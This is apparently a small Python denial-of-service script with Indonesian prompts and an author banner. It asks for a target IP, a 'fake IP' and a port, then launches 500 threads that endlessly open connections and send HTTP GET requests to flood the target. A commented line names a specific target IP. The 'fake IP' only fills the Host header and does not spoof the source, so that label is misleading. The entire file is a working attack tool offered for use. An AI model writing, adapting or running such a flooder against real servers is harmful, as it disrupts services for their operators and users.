import socket
import threading 

#target_ip  = '195.20.52.179'
#fake_ip = '182.21.20.32'
#port = 80

print("\n\n")
print("         +-------------------------------------+")
print("         |          jumat.3 sept               |")
print("         |   Github: https://github.com/dnan-v |")
print("         |      Author: Dnanjer Ploit          |")    
print("         +---------------------------dnan------+ ")

print("\n\n")

print("masukan ip addres ya")
print("mendapatkan ip di terminal. eg #target = '120.00.00.000'")
target = input("\t == > ")
print("masukan fake ip palsu: #fake_ip = '120.00.00.01'  ")
fake_ip = input("\t\t ==> ")
print("berapa port ya su ? ")
port = input("\t\t ==> ")

port = int(port)

attack_num = 0

print("sabar d proses su...")

def attack():

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        packesnum =attack_num
        packesnum= str(packesnum)
        print("mengirim target => "+packesnum)
        print("berhasil terkirim")
        print("")
        
        s.close()
print("berhasil  terkrim!")
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()


